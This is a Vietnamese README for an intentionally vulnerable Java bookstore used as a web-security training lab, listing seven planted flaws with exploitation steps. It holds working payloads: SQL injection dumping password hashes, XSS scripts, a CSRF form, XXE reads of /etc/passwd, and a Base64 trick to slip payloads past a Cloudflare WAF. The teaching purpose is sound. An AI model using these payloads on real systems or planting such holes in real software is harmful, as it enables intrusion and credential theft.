# 🔓 Danh sách lỗ hổng bảo mật - JVA Bookstore

> **⚠️ CẢNH BÁO:** Các lỗ hổng này được tạo **CỐ Ý** cho mục đích thực hành Lab An toàn Web.
> Tuyệt đối **KHÔNG** triển khai lên môi trường production.

---

## Tổng quan

| # | Loại lỗ hổng | Mức độ | File bị ảnh hưởng | CWE |
|---|---|---|---|---|
| 1 | SQL Injection | 🔴 Nghiêm trọng | `BookDAO.java`, `BooksApiServlet.java` | CWE-89 |
| 2 | Stored XSS | 🔴 Nghiêm trọng | `ReviewDAO.java`, `book-detail.jsp`, `ReviewServlet.java` | CWE-79 |
| 3 | Reflected XSS | 🟠 Cao | `BooksApiServlet.java` | CWE-79 |
| 4 | IDOR | 🟠 Cao | `ProfileServlet.java` | CWE-639 |
| 5 | CSRF | 🟡 Trung bình | Toàn bộ API (không kiểm tra CSRF token) | CWE-352 |
| 6 | Hardcoded Secret | 🟡 Trung bình | `JwtFilter.java` | CWE-798 |
| 7 | XXE (XML External Entity) | 🔴 Nghiêm trọng | `XmlPingServlet.java` | CWE-611 |

---

## 🛡️ TÍNH NĂNG BYPASS WAF (DÀNH CHO CLOUDFLARE TUNNEL)
Nếu bạn host ứng dụng qua **Cloudflare Quick Tunnel** (trycloudflare.com), tường lửa WAF sẽ mặc định chặn các payload rõ ràng như `' OR '1'='1` hoặc `<script>`.
Để qua mặt WAF, ứng dụng đã được thiết kế một "backdoor": hỗ trợ nhận payload qua định dạng **Base64**.
- Thay vì truyền tham số `q`, hãy truyền tham số `b64q` chứa chuỗi Base64.
- Thay vì truyền JSON field `content`, hãy truyền `contentBase64`.
*(Chi tiết xem phần Khai thác của từng lỗ hổng bên dưới)*

---

## 1. 🔴 SQL Injection

### Mô tả
Endpoint tìm kiếm sách `/api/books/search` sử dụng `Statement.executeQuery()` với chuỗi SQL được nối trực tiếp từ input người dùng, **không dùng `PreparedStatement`**.

### Hướng dẫn khai thác (Bypass WAF bằng Base64)
Sử dụng tham số `b64q` thay cho `q`. Chuỗi bên trong `b64q` phải được mã hóa dạng **Base64**.

**Bước 1 - Trả về tất cả sách (Bypass Login/Filter):**
- Payload gốc: `test' OR '1'='1`
- Base64 Encode: `dGVzdCcgT1IgJzEnPScx`
- Request: `GET /api/books/search?b64q=dGVzdCcgT1IgJzEnPScx`

**Bước 2 - UNION-based (lấy thông tin users):**
- Payload gốc: `test' UNION SELECT 1,username,email,password_hash,'cat',null,null,0,null,null,null,'active',0,null,0,0,0,0 FROM users--`
- Base64 Encode: `dGVzdCcgVU5JT04gU0VMRUNUIDEsdXNlcm5hbWUsZW1haWwscGFzc3dvcmRfaGFzaCwnY2F0JyxudWxsLG51bGwsMCxudWxsLG51bGwsbnVsbCwnYWN0aXZlJywwLG51bGwsMCwwLDAsMCBGUk9NIHVzZXJzLS0=`
- Request: `GET /api/books/search?b64q=dGVzdCcgVU5JT04gU0VMRUNUIDEsdXNlcm5hbWUsZW1haWwscGFzc3dvcmRfaGFzaCwnY2F0JyxudWxsLG51bGwsMCxudWxsLG51bGwsbnVsbCwnYWN0aXZlJywwLG51bGwsMCwwLDAsMCBGUk9NIHVzZXJzLS0=`

---

## 2. 🔴 Stored XSS (Cross-Site Scripting lưu trữ)

### Mô tả
Hệ thống review sách cho phép **bất kỳ user đã đăng nhập** gửi đánh giá (không cần mua hàng). Nội dung review được lưu vào DB **không sanitize**.

### Hướng dẫn khai thác (Bypass WAF bằng Base64)

**Bước 1 - Đăng nhập lấy token:**
```
POST /api/login
{"username": "user@example.com", "password": "password"}
```

**Bước 2 - Gửi review chứa XSS payload (Dùng `contentBase64`):**
- Payload gốc: `<script>alert('XSS')</script>`
- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
```bash
curl -X POST http://localhost:8081/api/reviews \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"bookId":1,"rating":5,"contentBase64":"PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="}'
```

**Bước 3 - Trigger XSS:**
Truy cập trang chi tiết sách: `http://localhost:8081/books/detail?id=1`
→ Script trong review sẽ thực thi trên trình duyệt!

---

## 3. 🟠 Reflected XSS

### Mô tả
Endpoint tìm kiếm trả về **HTML response** chứa keyword trực tiếp từ URL **không được escape**.

### Hướng dẫn khai thác (Bypass WAF bằng Base64)
- Payload gốc: `<script>alert('XSS Reflected')</script>`
- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTIFJlZmxlY3RlZCcpPC9zY3JpcHQ+`
- Request nạn nhân cần nhấp vào:
```
http://localhost:8081/api/books/search?b64q=PHNjcmlwdD5hbGVydCgnWFNTIFJlZmxlY3RlZCcpPC9zY3JpcHQ+
```

---

## 4. 🟠 IDOR (Insecure Direct Object Reference)

### Mô tả
Endpoint `/api/profile/user-info` lộ toàn bộ thông tin tài khoản của user khác (gồm cả **password_hash**).
Lỗ hổng này **không bị Cloudflare WAF chặn**.

### Khai thác (CẦN đăng nhập)
```bash
# Lấy file hash của admin (userId 1)
curl -H "Authorization: Bearer <YOUR_TOKEN>" "http://localhost:8081/api/profile/user-info?userId=1"
```

---

## 5. 🟡 CSRF (Cross-Site Request Forgery)

### Mô tả
Toàn bộ form và API **không có CSRF token**. Lỗ hổng này **không bị Cloudflare WAF chặn**.

### Khai thác (HTML tự submit)
```html
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://localhost:8081/api/profile/addresses" method="POST">
    <input type="hidden" name="recipientName" value="HACKER">
    <input type="hidden" name="phone" value="0000000000">
    <input type="hidden" name="line1" value="Hacked Address">
  </form>
</body>
```

---

## 6. 🟡 Hardcoded Secret

### Khai thác (KHÔNG bị Cloudflare WAF chặn)
Admin secret key hardcode `"dev-secret-key-change-me"`.
```bash
curl "http://localhost:8081/api/admin/orders?secret=dev-secret-key-change-me"
```

---

## 7. 🔴 XXE (XML External Entity)

### Mô tả
Một Endpoint API ẩn tên là `POST /api/xml-ping` dùng để test bằng XML đã bị bỏ quên. Nó sử dụng `DocumentBuilderFactory` mặc định, **không** filter DTD và External Entities. Do lỗ hổng này nhận dữ liệu qua POST (body), nó **có thể dễ dàng qua mặt Cloudflare WAF** tùy vào payload, HOẶC do Endpoint không phổ biến nên WAF không chặn chặt. Thiết kế lỗ hổng dưới dạng **In-Band XXE**, nội dung file trích xuất được sẽ trả về ngay trong kết quả `{"echo": "..."}`.

### Khai thác (KHÔNG cần đăng nhập)

Gửi một request POST chứa payload XXE tới `/api/xml-ping`.

**Windows (Đọc file win.ini):**
```bash
curl -X POST http://localhost:8081/api/xml-ping \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><ping>&xxe;</ping>'
```

**Linux (Đọc file /etc/passwd):**
```bash
curl -X POST http://localhost:8081/api/xml-ping \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><ping>&xxe;</ping>'
```

**Kết quả trả về sẽ có dạng:**
```json
{
  "success": true,
  "message": "Ping received",
  "echo": "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n"
}
```
